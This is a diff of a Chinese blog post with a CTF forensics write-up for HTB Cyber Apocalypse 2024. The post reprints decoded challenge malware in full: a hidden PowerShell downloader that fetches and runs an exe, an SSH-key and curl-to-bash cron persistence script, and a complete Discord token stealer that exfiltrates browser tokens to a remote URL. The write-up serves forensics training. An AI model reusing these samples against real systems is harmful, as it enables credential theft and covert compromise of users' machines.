@@ -689,7 +689,534 @@ MFT由一个个MFT项（也称为文件记录(File Record)）组成，每个MFT�
 </code></pre>
 <p>答完所有问题之后 成功拿到flag</p>
 <p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403132117686.png" alt="image-20240313211708636"></p>
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://w3nx1z1.github.io">w3nx1z1</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://w3nx1z1.github.io/2024/03/16/Cyber%20Apocalypse%202024%20Hacker%20Royale/">http://w3nx1z1.github.io/2024/03/16/Cyber Apocalypse 2024 Hacker Royale/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://w3nx1z1.github.io" target="_blank">w3nx1z1</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/forensics/">forensics</a></div><div class="post_share"><div class="social-share" data-image="/img/mikey.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/03/30/NKCTF2024/" title="2024NKCTF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">2024NKCTF</div></div></a></div><div class="next-post pull-right"><a href="/2024/03/03/2023%E5%B9%B4%E4%B8%AD%E5%9B%BD%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%86%B3%E8%B5%9B-misc/" title="2023年中国工业互联网安全大赛决赛-misc"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2023年中国工业互联网安全大赛决赛-misc</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/05/02/2024%E6%95%B0%E4%BF%A1%E6%9D%AF/" title="2024数信杯北部赛区wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-02</div><div class="title">2024数信杯北部赛区wp</div></div></a></div><div><a href="/2024/10/03/2024%E6%95%B0%E4%BF%A1%E6%9D%AF%E5%8C%97%E5%8C%BA%E5%86%B3%E8%B5%9B%E5%AE%9E%E6%93%8D/" title="2024数信杯北区决赛实操"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-03</div><div class="title">2024数信杯北区决赛实操</div></div></a></div><div><a href="/2024/04/29/2024%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD/" title="2024数字中国"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-29</div><div class="title">2024数字中国</div></div></a></div><div><a href="/2024/06/11/R3CTF/" title="R3CTF2024"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-11</div><div class="title">R3CTF2024</div></div></a></div><div><a href="/2024/08/04/TFCCTF%E4%B9%8Bforensics/" title="TFCCTF2024之forensics"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-04</div><div class="title">TFCCTF2024之forensics</div></div></a></div><div><a href="/2024/03/30/NKCTF2024/" title="2024NKCTF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-30</div><div class="title">2024NKCTF</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/mikey.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="avatar"/></div><div class="author-info__name">w3nx1z1</div><div class="author-info__description">你相信引力吗？</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">56</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/w3nx1z1"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/w3nx1z1" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1281027651@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=1281027651&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到w3nx1z1的博客!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HTBCyberCTF2024"><span class="toc-text">HTBCyberCTF2024</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Forensics-%E9%83%A8%E5%88%86"><span class="toc-text">Forensics(部分)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Urgent"><span class="toc-text">Urgent</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#It-Has-Begun"><span class="toc-text">It Has Begun</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#An-unusual-sighting"><span class="toc-text">An unusual sighting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fake-Boost"><span class="toc-text">Fake Boost</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Phreaky"><span class="toc-text">Phreaky</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#data-siege"><span class="toc-text">data_siege</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pursue-The-Tracks"><span class="toc-text">Pursue The Tracks</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/26/Offensive%20Pentesting-DailyBugle/" title="Offensive Pentesting-DailyBugle">Offensive Pentesting-DailyBugle</a><time datetime="2024-11-26T09:04:51.489Z" title="发表于 2024-11-26 17:04:51">2024-11-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/26/Offensive%20Pentesting-GameZone/" title="Offensive Pentesting-GameZone">Offensive Pentesting-GameZone</a><time datetime="2024-11-26T09:04:48.797Z" title="发表于 2024-11-26 17:04:48">2024-11-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/26/Offensive%20Pentesting-Kenobi/" title="Offensive Pentesting-Kenobi">Offensive Pentesting-Kenobi</a><time datetime="2024-11-26T09:04:45.988Z" title="发表于 2024-11-26 17:04:45">2024-11-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/26/Offensive%20Pentesting-Skynet/" title="Offensive Pentesting-Skynet">Offensive Pentesting-Skynet</a><time datetime="2024-11-26T09:04:38.428Z" title="发表于 2024-11-26 17:04:38">2024-11-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/26/Offensive%20Pentesting-Vulnversity/" title="Offensive Pentesting-Vulnversity">Offensive Pentesting-Vulnversity</a><time datetime="2024-11-26T09:04:30.499Z" title="发表于 2024-11-26 17:04:30">2024-11-26</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/baobao.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024  <i id="heartbeat" class="fa fas fa-heartbeat"></i> w3nx1z1</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://w3nx1z1.github.io">w3nx1z1</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://w3nx1z1.github.io/2024/03/16/Cyber%20Apocalypse%202024%20Hacker%20Royale/">http://w3nx1z1.github.io/2024/03/16/Cyber Apocalypse 2024 Hacker Royale/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://w3nx1z1.github.io" target="_blank">w3nx1z1</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/forensics/">forensics</a></div><div class="post_share"><div class="social-share" data-image="/img/mikey.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/03/30/NKCTF2024/" title="2024NKCTF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">2024NKCTF</div></div></a></div><div class="next-post pull-right"><a href="/2024/03/03/2023%E5%B9%B4%E4%B8%AD%E5%9B%BD%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%86%B3%E8%B5%9B-misc/" title="2023年中国工业互联网安全大赛决赛-misc"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2023年中国工业互联网安全大赛决赛-misc</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/10/03/2024%E6%95%B0%E4%BF%A1%E6%9D%AF%E5%8C%97%E5%8C%BA%E5%86%B3%E8%B5%9B%E5%AE%9E%E6%93%8D/" title="2024数信杯北区决赛实操"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-03</div><div class="title">2024数信杯北区决赛实操</div></div></a></div><div><a href="/2024/05/02/2024%E6%95%B0%E4%BF%A1%E6%9D%AF/" title="2024数信杯北部赛区wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-02</div><div class="title">2024数信杯北部赛区wp</div></div></a></div><div><a href="/2024/04/29/2024%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD/" title="2024数字中国"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-29</div><div class="title">2024数字中国</div></div></a></div><div><a href="/2024/03/30/NKCTF2024/" title="2024NKCTF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-30</div><div class="title">2024NKCTF</div></div></a></div><div><a href="/2024/06/11/R3CTF/" title="R3CTF2024"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-11</div><div class="title">R3CTF2024</div></div></a></div><div><a href="/2024/08/04/TFCCTF%E4%B9%8Bforensics/" title="TFCCTF2024之forensics"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-04</div><div class="title">TFCCTF2024之forensics</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><article class="post-content" id="article-container"><h1 id="HTBCyberCTF2024"><a href="#HTBCyberCTF2024" class="headerlink" title="HTBCyberCTF2024"></a>HTBCyberCTF2024</h1><h2 id="Forensics-部分"><a href="#Forensics-部分" class="headerlink" title="Forensics(部分)"></a>Forensics(部分)</h2><h3 id="Urgent"><a href="#Urgent" class="headerlink" title="Urgent"></a>Urgent</h3><p>给的附件是一个xml文件 直接notepad打开 </p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403111402394.png" alt="image-20240311140231315"></p>
+<p>解base64</p>
+<pre><code>document.write(unescape(&#39;
+&gt;_ 
+404 Not Found
+Sub window_onload
+const impersonation = 3
+Const HIDDEN_WINDOW = 12
+Set Locator = CreateObject(&quot;WbemScripting.SWbemLocator&quot;)
+Set Service = Locator.ConnectServer()
+Service.Security_.ImpersonationLevel=impersonation
+Set objStartup = Service.Get(&quot;Win32_ProcessStartup&quot;)
+Set objConfig = objStartup.SpawnInstance_
+Set Process = Service.Get(&quot;Win32_Process&quot;)
+Error = Process.Create(&quot;cmd.exe /c powershell.exe -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile(&#39;https://standunited.htb/online/forms/form1.exe&#39;,&#39;%appdata%\form1.exe&#39;);Start-Process &#39;%appdata%\form1.exe&#39;;$flag=&#39;HTB&#123;4n0th3r_d4y_4n0th3r_ph1shi1ng_4tt3mpT&#125;&quot;, null, objConfig, intProcessID)
+window.close()
+end sub
+&#39;));
+</code></pre>
+<p>拿到flag</p>
+<h3 id="It-Has-Begun"><a href="#It-Has-Begun" class="headerlink" title="It Has Begun"></a>It Has Begun</h3><pre><code>The Fray is upon us, and the very first challenge has been released! Are you ready factions!? Considering this is just the beginning, if you cannot musted the teamwork needed this early, then your doom is likely inevitable.
+</code></pre>
+<p>直接仔细翻看给的script.sh  找到两段关键的</p>
+<pre><code>echo &quot;ssh-rsa AAAAB4NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D7s4J0L7XV2kep0rNzgY1S1IdE8HDAf7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B user@tS_u0y_ll1w&#123;BTH&quot; &gt;&gt; /root/.ssh/authorized_keys
+
+echo &quot;*/5 * * * * root curl -s http://legions.korp.htb/0xda4.0xda4.$ARCH | bash -c &#39;NG5kX3kwdVJfR3IwdU5kISF9&#39; &quot; &gt;&gt; /etc/crontab
+</code></pre>
+<p>第一段flag</p>
+<pre><code>HTB&#123;w1ll_y0u_St
+</code></pre>
+<p>第二段是解base64<code>NG5kX3kwdVJfR3IwdU5kISF9</code></p>
+<pre><code>4nd_y0uR_Gr0uNd!!&#125;
+</code></pre>
+<h3 id="An-unusual-sighting"><a href="#An-unusual-sighting" class="headerlink" title="An unusual sighting"></a>An unusual sighting</h3><pre><code>As the preparations come to an end, and The Fray draws near each day, our newly established team has started work on refactoring the new CMS application for the competition. However, after some time we noticed that a lot of our work mysteriously has been disappearing! We managed to extract the SSH Logs and the Bash History from our dev server in question. The faction that manages to uncover the perpetrator will have a massive bonus come competition!
+
+随着准备工作的结束，以及 The Fray 的临近，我们新成立的团队已经开始为比赛重构新的 CMS 应用程序。然而，一段时间后，我们注意到我们的很多工作都神秘地消失了！我们设法从有问题的开发服务器中提取了 SSH 日志和 Bash 历史记录。设法发现肇事者的派系将获得巨大的奖金！
+</code></pre>
+<p>使用nc连接docker容器 </p>
+<p>第一个问题</p>
+<pre><code>What is the IP Address and Port of the SSH Server (IP:PORT)
+</code></pre>
+<p>问的是通过ssh连接的ip和端口是什么 </p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151122502.png" alt="image-20240315112236452"></p>
+<p>看到第三行的连接记录 前面的ip和端口是发起连接的 后面的ip和端口是连接的目标 后面的记录都是如此 那后面的ip和端口就是想通过ssh进行连接的ip和端口</p>
+<pre><code>100.107.36.130:2221
+</code></pre>
+<p>第二个问题</p>
+<pre><code>What time is the first successful Login
+</code></pre>
+<p>问的是第一次成功连接的时间</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151126225.png" alt="image-20240315112617183"></p>
+<p>可以看到第一次连接是失败了 第二次连接成功 那第二次连接就是第一次成功连接 </p>
+<pre><code>2024-02-13 11:29:50
+</code></pre>
+<p>第三个问题</p>
+<pre><code>What is the time of the unusual Login
+</code></pre>
+<p>问的是非常规登陆的时间 </p>
+<p>这里可能问的是特殊ip的登陆  只有一个特殊ip<code>2.67.182.119</code> 看着很像挖矿病毒或者攻击者的外部ip</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151603252.png" alt="image-20240315160355183"></p>
+<pre><code>2024-02-19 04:00:14
+</code></pre>
+<p>第四个问题</p>
+<pre><code>What is the Fingerprint of the attacker&#39;s public key
+</code></pre>
+<p>承接上一题 </p>
+<pre><code>OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4
+</code></pre>
+<p>第五个问题</p>
+<pre><code>What is the first command the attacker executed after logging in
+</code></pre>
+<p>问的是攻击者在登陆之后执行的第一个命令是什么</p>
+<p>看<code>bash_history.txt</code> 由第三个问题知道攻击者是在<code>2024-02-19 04:00:14</code>之后登陆的 直接找这个时间对应的命令记录</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151615339.png" alt="image-20240315161550301"></p>
+<pre><code>whoami
+</code></pre>
+<p>第六个问题</p>
+<pre><code>What is the final command the attacker executed before logging out
+</code></pre>
+<p>问的是攻击者在登陆注销前执行的最后一个命令是什么</p>
+<p>看<code>sshd.log</code> 攻击者是在<code>2024-02-19 04:38:17</code> 进行注销的</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151618823.png" alt="image-20240315161830759"></p>
+<p>再在<code>bash_history.txt</code>里面看看这个时间前执行的命令</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151619193.png" alt="image-20240315161928153"></p>
+<pre><code>./setup
+</code></pre>
+<p>然后就可以拿到flag</p>
+<pre><code>HTB&#123;B3sT_0f_luck_1n_th3_Fr4y!!&#125;
+</code></pre>
+<h3 id="Fake-Boost"><a href="#Fake-Boost" class="headerlink" title="Fake Boost"></a>Fake Boost</h3><pre><code>In the shadow of The Fray, a new test called &quot;&quot;Fake Boost&quot;&quot; whispers promises of free Discord Nitro perks. It&#39;s a trap, set in a world where nothing comes without a cost. As factions clash and alliances shift, the truth behind Fake Boost could be the key to survival or downfall. Will your faction see through the deception? KORP™ challenges you to discern reality from illusion in this cunning trial.
+</code></pre>
+<p>在流量包中提取出来一个文件<code>freediscordnitro</code> 查看内容 发现是对一个字符串的处理 </p>
+<pre><code>$s0yAY2gmHVNFd7QZ = $jozeq3n.ToCharArray() ; [array]::Reverse($s0yAY2gmHVNFd7QZ) ; -join $s0yAY2gmHVNFd7QZ 2&gt;&amp;1&gt; $null ;
+$LOaDcODEoPX3ZoUgP2T6cvl3KEK = [sYSTeM.TeXt.ENcODING]::UTf8.geTSTRiNG([SYSTEm.cOnVeRT]::FRoMBaSe64sTRing(&quot;$s0yAY2gmHVNFd7QZ&quot;)) ;
+</code></pre>
+<p>先是将字符串进行反转 然后在解base64 </p>
+<pre><code>$URL = &quot;http://192.168.116.135:8080/rj1893rj1joijdkajwda&quot;
+
+function Steal &#123;
+    param (
+        [string]$path
+    )
+
+    $tokens = @()
+
+    try &#123;
+        Get-ChildItem -Path $path -File -Recurse -Force | ForEach-Object &#123;
+            
+            try &#123;
+                $fileContent = Get-Content -Path $_.FullName -Raw -ErrorAction Stop
+
+                foreach ($regex in @(&#39;[\w-]&#123;26&#125;\.[\w-]&#123;6&#125;\.[\w-]&#123;25,110&#125;&#39;, &#39;mfa\.[\w-]&#123;80,95&#125;&#39;)) &#123;
+                    $tokens += $fileContent | Select-String -Pattern $regex -AllMatches | ForEach-Object &#123;
+                        $_.Matches.Value
+                    &#125;
+                &#125;
+            &#125; catch &#123;&#125;
+        &#125;
+    &#125; catch &#123;&#125;
+
+    return $tokens
+&#125;
+
+function GenerateDiscordNitroCodes &#123;
+    param (
+        [int]$numberOfCodes = 10,
+        [int]$codeLength = 16
+    )
+
+    $chars = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;
+    $codes = @()
+
+    for ($i = 0; $i -lt $numberOfCodes; $i++) &#123;
+        $code = -join (1..$codeLength | ForEach-Object &#123; Get-Random -InputObject $chars.ToCharArray() &#125;)
+        $codes += $code
+    &#125;
+
+    return $codes
+&#125;
+
+function Get-DiscordUserInfo &#123;
+    [CmdletBinding()]
+    Param (
+        [Parameter(Mandatory = $true)]
+        [string]$Token
+    )
+
+    process &#123;
+        try &#123;
+            $Headers = @&#123;
+                &quot;Authorization&quot; = $Token
+                &quot;Content-Type&quot; = &quot;application/json&quot;
+                &quot;User-Agent&quot; = &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48 Safari/537.36&quot;
+            &#125;
+
+            $Uri = &quot;https://discord.com/api/v9/users/@me&quot;
+
+            $Response = Invoke-RestMethod -Uri $Uri -Method Get -Headers $Headers
+            return $Response
+        &#125;
+        catch &#123;&#125;
+    &#125;
+&#125;
+
+function Create-AesManagedObject($key, $IV, $mode) &#123;
+    $aesManaged = New-Object &quot;System.Security.Cryptography.AesManaged&quot;
+
+    if ($mode=&quot;CBC&quot;) &#123; $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC &#125;
+    elseif ($mode=&quot;CFB&quot;) &#123;$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CFB&#125;
+    elseif ($mode=&quot;CTS&quot;) &#123;$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CTS&#125;
+    elseif ($mode=&quot;ECB&quot;) &#123;$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::ECB&#125;
+    elseif ($mode=&quot;OFB&quot;)&#123;$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::OFB&#125;
+
+
+    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+    $aesManaged.BlockSize = 128
+    $aesManaged.KeySize = 256
+    if ($IV) &#123;
+        if ($IV.getType().Name -eq &quot;String&quot;) &#123;
+            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
+        &#125;
+        else &#123;
+            $aesManaged.IV = $IV
+        &#125;
+    &#125;
+    if ($key) &#123;
+        if ($key.getType().Name -eq &quot;String&quot;) &#123;
+            $aesManaged.Key = [System.Convert]::FromBase64String($key)
+        &#125;
+        else &#123;
+            $aesManaged.Key = $key
+        &#125;
+    &#125;
+    $aesManaged
+&#125;
+
+function Encrypt-String($key, $plaintext) &#123;
+    $bytes = [System.Text.Encoding]::UTF8.GetBytes($plaintext)
+    $aesManaged = Create-AesManagedObject $key
+    $encryptor = $aesManaged.CreateEncryptor()
+    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
+    [byte[]] $fullData = $aesManaged.IV + $encryptedData
+    [System.Convert]::ToBase64String($fullData)
+&#125;
+
+Write-Host &quot;
+______              ______ _                       _   _   _ _ _               _____  _____  _____   ___ 
+|  ___|             |  _  (_)                     | | | \ | (_) |             / __  \|  _  |/ __  \ /   |
+| |_ _ __ ___  ___  | | | |_ ___  ___ ___  _ __ __| | |  \| |_| |_ _ __ ___   `&#39; / /&#39;| |/&#39; |`&#39; / /&#39;/ /| |
+|  _| &#39;__/ _ \/ _ \ | | | | / __|/ __/ _ \| &#39;__/ _` | | . ` | | __| &#39;__/ _ \    / /  |  /| |  / / / /_| |
+| | | | |  __/  __/ | |/ /| \__ \ (_| (_) | | | (_| | | |\  | | |_| | | (_) | ./ /___\ |_/ /./ /__\___  |
+\_| |_|  \___|\___| |___/ |_|___/\___\___/|_|  \__,_| \_| \_/_|\__|_|  \___/  \_____/ \___/ \_____/   |_/
+                                                                                                         
+                                                                                                         &quot;
+Write-Host &quot;Generating Discord nitro keys! Please be patient...&quot;
+
+$local = $env:LOCALAPPDATA
+$roaming = $env:APPDATA
+$part1 = &quot;SFRCe2ZyMzNfTjE3cjBHM25fM3hwMDUzZCFf&quot;
+
+$paths = @&#123;
+    &#39;Google Chrome&#39; = &quot;$local\Google\Chrome\User Data\Default&quot;
+    &#39;Brave&#39; = &quot;$local\BraveSoftware\Brave-Browser\User Data\Default\&quot;
+    &#39;Opera&#39; = &quot;$roaming\Opera Software\Opera Stable&quot;
+    &#39;Firefox&#39; = &quot;$roaming\Mozilla\Firefox\Profiles&quot;
+&#125;
+
+$headers = @&#123;
+    &#39;Content-Type&#39; = &#39;application/json&#39;
+    &#39;User-Agent&#39; = &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48 Safari/537.36&#39;
+&#125;
+
+$allTokens = @()
+foreach ($platform in $paths.Keys) &#123;
+    $currentPath = $paths[$platform]
+
+    if (-not (Test-Path $currentPath -PathType Container)) &#123;continue&#125;
+
+    $tokens = Steal -path $currentPath
+    $allTokens += $tokens
+&#125;
+
+$userInfos = @()
+foreach ($token in $allTokens) &#123;
+    $userInfo = Get-DiscordUserInfo -Token $token
+    if ($userInfo) &#123;
+        $userDetails = [PSCustomObject]@&#123;
+            ID = $userInfo.id
+            Email = $userInfo.email
+            GlobalName = $userInfo.global_name
+            Token = $token
+        &#125;
+        $userInfos += $userDetails
+    &#125;
+&#125;
+
+$AES_KEY = &quot;Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k=&quot;
+$payload = $userInfos | ConvertTo-Json -Depth 10
+$encryptedData = Encrypt-String -key $AES_KEY -plaintext $payload
+
+try &#123;
+    $headers = @&#123;
+        &#39;Content-Type&#39; = &#39;text/plain&#39;
+        &#39;User-Agent&#39; = &#39;Mozilla/5.0&#39;
+    &#125;
+    Invoke-RestMethod -Uri $URL -Method Post -Headers $headers -Body $encryptedData
+&#125;
+catch &#123;&#125;
+
+Write-Host &quot;Success! Discord Nitro Keys:&quot;
+$keys = GenerateDiscordNitroCodes -numberOfCodes 5 -codeLength 16
+$keys | ForEach-Object &#123; Write-Output $_ &#125;
+</code></pre>
+<p>找到第一部分flag</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403111908010.png" alt="image-20240311190848912"></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403111908936.png" alt="image-20240311190856886"></p>
+<pre><code>HTB&#123;fr33_N17r0G3n_3xp053d!_
+</code></pre>
+<p>流量包里面还有一个文件<code>rj1893rj1joijdkajwda</code> </p>
